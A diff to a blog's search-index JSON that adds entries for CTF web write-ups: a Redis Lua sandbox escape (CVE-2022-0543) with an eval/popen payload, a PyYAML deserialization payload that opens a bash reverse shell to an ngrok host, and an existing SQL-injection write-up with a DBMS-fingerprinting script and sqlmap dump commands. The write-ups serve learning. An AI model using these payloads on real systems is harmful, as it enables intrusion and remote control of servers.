@@ -1,6 +1,40 @@
 [
   
   {
+    "title": "KnightCTF - Luana",
+    "url": "/posts/KnightCTF2025_lua/",
+    "categories": "Writeups, CTFTime2025, Knightctf",
+    "tags": "writeups, web, redis, sandbox-escape, CVE-2022-0543",
+    "date": "2025-01-20 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Introduction          Knight CTF        Enumeration          Index page      Redis        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online...",
+    "content": "  Introduction          Knight CTF        Enumeration          Index page      Redis        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online jeopardy style Capture the Flag (CTF) competition hosted by the Knight Squad community from Bangladesh. This is the first international CTF from Bangladesh.   Link to the event We’ve finished 117 on 759.EnumerationIndex pageLet’s start by accessing the index page:InterestingRedisUsually the port 6379 is used for redis. Let’s confirm that the port is executing redis using nmap, then try to connect to the remote server using the redis-cli.We are connected to a Redis server, version 5.0.7Fortunatelly, the Redis server doesn’t require authentication! Let’s attempt to get RCE.ExploitationGetting RCEThe classic technique to get an RCE with redis is to write a PHP payload into a file, then execute the PHP script with the web-server. Unfortunatelly the server is using python, not PHP …After some google search for CVEs affecting this redis version, I found this:Apparently we can get RCE by launching the redis internal Lua sandbox, then escaping it, using this payload:eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0Let’s confirm that we have code execution:We’ve successfully executed the id commandGetting flagUsing the same exploit we can ls and cat the flag:KCTF{c0n6r475_b015_n1c3_c47ch}"
+  },
+  
+  {
+    "title": "KnightCTF - Baby Injection",
+    "url": "/posts/KnightCTF2025-baby_injection/",
+    "categories": "Writeups, CTFTime2025, Knightctf",
+    "tags": "writeups, web, flask, yaml-injection, unsecure-deserialization, rce",
+    "date": "2025-01-20 16:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Introduction          KnightCTF        Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online je...",
+    "content": "  Introduction          KnightCTF        Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      IntroductionKnightCTFKnightCTF 2025 is an online jeopardy style Capture the Flag (CTF) competition hosted by the Knight Squad community from Bangladesh. This is the first international CTF from Bangladesh.   Link to the event We’ve finished 117 on 759.EnumerationEnumerating websiteLet’s start by accessing the index page:Website index pageWe got redirected to / with a strange base64 payload, let’s decode this:Ok so the server renders YAML probably by decoding the base64, load it, then write it on the page.We can search if there is vulnerabilities in here, I’ll search for keywords like yaml injection python:We got a hit !You can read the article here. For this CTF, we’re only interested by this part:ExploitationGetting RCELet’s adapt this payload to get RCE. I’ll simply replace the time.sleep [params] by os.system [params], and put a bash reverse shell like this:yaml: !!python/object/apply:os.system [\"bash -c 'bash -i &gt;&amp; /dev/tcp/5.tcp.eu.ngrok.io/14824 0&gt;&amp;1'\"]And encode it with base64:eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNS50Y3AuZXUubmdyb2suaW8vMTQ4MjQgMD4mMSciXQ==We set up a netcat + ngrok listener:Then I try to access http://TARGET_IP/{base64_payload}:Getting FlagKCTF{d38787fb0741bd0efdad8ed01f037740}"
+  },
+  
+  {
     "title": "Srdnlen CTF - Speed",
     "url": "/posts/SrdnlenCTF2025-racecondition/",
     "categories": "Writeups, CTFTime2025, Srdnlen",
@@ -20,7 +54,7 @@
   {
     "title": "Pointer Overflow CTF",
     "url": "/posts/PoCTF2025/",
-    "categories": "Writeups, CTFTime2025, Srdnlen",
+    "categories": "Writeups, CTFTime2025, PoCTF",
     "tags": "writeups, web, sql-injection, sqlmap",
     "date": "2025-01-18 16:00:00 +0000",
     
@@ -31,12 +65,12 @@
 
     
     "snippet": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type...",
-    "content": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type          Leaking tables          Leaking columns          Dumping tables                    IntroductionPointer Overflow CTFThe University of Wisconsin - Stevens Point and the Department of Computing and New Media Technologies happily welcomes you to the Pointer Overflow CTF. This contest is a challenge of ingenuity and skill brought to you in honor of our incredible students and alumni.   Link to the event We managed to finish 132 on 2509 with my team fish3r.EnumerationIndex PageAs you can see, the index page is static (so uninteresting). Let’s move on !Search pageOh, an inputThis payload will test for SSTI, SQLi and XSS. Let’s send it to the server and see how it goes:PayloadThe server crashesThe SSTI would have simply returned 49, and the XSS would have just printed out a title (a). The only payload that causes the server to crash is the SQLi one.Let’s confirm:We have an SQL injection !Identifying DBMSSince I’m lazy, I tried using SQLmap directly, but unfortunately it didn’t work. To make it work, we need to optimize the syntax that we’ll use. We need:  the DBMS  the SQLi METHOD (error based, time based…)  the POST request file for SQLmapTo identify the DBMS I used payloads from PayloadsAllTheThings and analyzed the server responses. In our case, a 500 response indicates that the payload didn’t work, meaning the server wasn’t using the associated DBMS.I’m still lazy, so I wrote a python script to automate the identification process:#!/usr/bin/env python3from requests import postfrom pwn import log# URL of the challengeurl = \"http://34.135.223.176:1928/search\"# Use payloads from payload all the thingspayloads = {    \"mysql\": \"connection_id()=connection_id()\",    \"mssql\": \"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\",    \"oracle:\": \"ROWNUM=ROWNUM\",    \"pgsql\": \"pg_client_encoding()=pg_client_encoding()\",    \"sqlite\": \"sqlite_version()=sqlite_version()\",    \"msaccess\": \"val(cvar(1))=1\",}# Loop through every payloadfor key in payloads:    log.info(f\"Sending payload for {key} ...\")    st = post(url, data={        \"query\": f\"' OR {payloads[key]} OR '\"    }).status_code    if(st == 500):        log.failure(\"Got 500\")    else:        log.info(f\"Got {st} !!!\")        log.success(f\"Backend is {key}\")        exit()The backend is using SQLite !ExploitationSQLmapIdentifying SQLi TypeAs we’ve seen earlier, the server returns a 500 when we put a '. This means the server doesn’t show database errors, so no error based SQLi. We can try boolean based and time based.First, we need to create the post request file for SQLmap:Now we can launch the attack with this file:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique BTLeaking tablessqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B --tablesThere’s one table named recipesLeaking columnsSince it’s boolean time based SQLi, dumping the full table will take a long time. To optimize, we’ll extract only the column that we are interested in.sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes --columnsSeveral columns found.Dumping tableFinally, we can dump the flag columns from recipes table:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes -C flag --dumpGot it !poctf{uwsp_7h3_5leep3r_mu57_4w4k3n}"
+    "content": "  Introduction          Pointer Overflow CTF        Enumeration          Index page      Search page      Identifying DBMS        Exploitation          SQLmap                  Identifying SQLi type          Leaking tables          Leaking columns          Dumping tables                    IntroductionPointer Overflow CTFThe University of Wisconsin - Stevens Point and the Department of Computing and New Media Technologies happily welcomes you to the Pointer Overflow CTF. This contest is a challenge of ingenuity and skill brought to you in honor of our incredible students and alumni.   Link to the event We managed to finish 132 on 2509 with my team (fish3r).EnumerationIndex PageAs you can see, the index page is static (so uninteresting). Let’s move on !Search pageOh, an inputThis payload will test for SSTI, SQLi and XSS. Let’s send it to the server and see how it goes:PayloadThe server crashesThe SSTI would have simply returned 49, and the XSS would have just printed out a title (a). The only payload that causes the server to crash is the SQLi one.Let’s confirm:We have an SQL injection !Identifying DBMSSince I’m lazy, I tried using SQLmap directly, but unfortunately it didn’t work. To make it work, we need to optimize the syntax that we’ll use. We need:  the DBMS  the SQLi METHOD (error based, time based…)  the POST request file for SQLmapTo identify the DBMS I used payloads from PayloadsAllTheThings and analyzed the server responses. In our case, a 500 response indicates that the payload didn’t work, meaning the server wasn’t using the associated DBMS.I’m still lazy, so I wrote a python script to automate the identification process:#!/usr/bin/env python3from requests import postfrom pwn import log# URL of the challengeurl = \"http://34.135.223.176:1928/search\"# Use payloads from payload all the thingspayloads = {    \"mysql\": \"connection_id()=connection_id()\",    \"mssql\": \"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\",    \"oracle:\": \"ROWNUM=ROWNUM\",    \"pgsql\": \"pg_client_encoding()=pg_client_encoding()\",    \"sqlite\": \"sqlite_version()=sqlite_version()\",    \"msaccess\": \"val(cvar(1))=1\",}# Loop through every payloadfor key in payloads:    log.info(f\"Sending payload for {key} ...\")    st = post(url, data={        \"query\": f\"' OR {payloads[key]} OR '\"    }).status_code    if(st == 500):        log.failure(\"Got 500\")    else:        log.info(f\"Got {st} !!!\")        log.success(f\"Backend is {key}\")        exit()The backend is using SQLite !ExploitationSQLmapIdentifying SQLi TypeAs we’ve seen earlier, the server returns a 500 when we put a '. This means the server doesn’t show database errors, so no error based SQLi. We can try boolean based and time based.First, we need to create the post request file for SQLmap:Now we can launch the attack with this file:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique BTLeaking tablessqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B --tablesThere’s one table named recipesLeaking columnsSince it’s boolean time based SQLi, dumping the full table will take a long time. To optimize, we’ll extract only the column that we are interested in.sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes --columnsSeveral columns found.Dumping tableFinally, we can dump the flag columns from recipes table:sqlmap -r req --dbms=sqlite --level 5 --risk 3 --technique B -T recipes -C flag --dumpGot it !poctf{uwsp_7h3_5leep3r_mu57_4w4k3n}"
   },
   
   {
     "title": "UofTCTF - Prismatic Blogs",
-    "url": "/posts/UofTCTF2025-prismatic/",
+    "url": "/posts/UofTCTF2025-prismatic-copy/",
     "categories": "Writeups, CTFTime2025, UofTCTF2025",
     "tags": "writeups, web, express, json-injection, orm-injection, prisma, python",
     "date": "2025-01-11 16:00:00 +0000",
